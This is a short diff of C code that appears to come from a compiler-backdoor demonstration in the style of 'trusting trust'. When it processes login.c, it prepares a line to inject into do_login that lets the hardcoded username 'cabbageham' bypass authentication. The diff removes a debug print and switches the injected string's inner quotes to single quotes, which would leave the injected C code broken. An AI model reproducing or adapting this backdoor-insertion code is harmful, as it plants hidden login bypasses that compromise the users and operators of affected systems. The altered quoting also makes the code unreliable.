@@ -1,6 +1,5 @@
  if(!strcmp(str, "login.c")) {
-        printf("testing\n");
-        char login_line[] = "if (!strcmp(username, \"cabbageham\"))return 0;";
+        char login_line[] = "if (!strcmp(username, 'cabbageham'))return 0;";
         FILE *source = fopen(str, "r");
 		FILE *temp = fopen("temp.txt", "w");
         char target_line[] = "static int do_login(const char *username){";
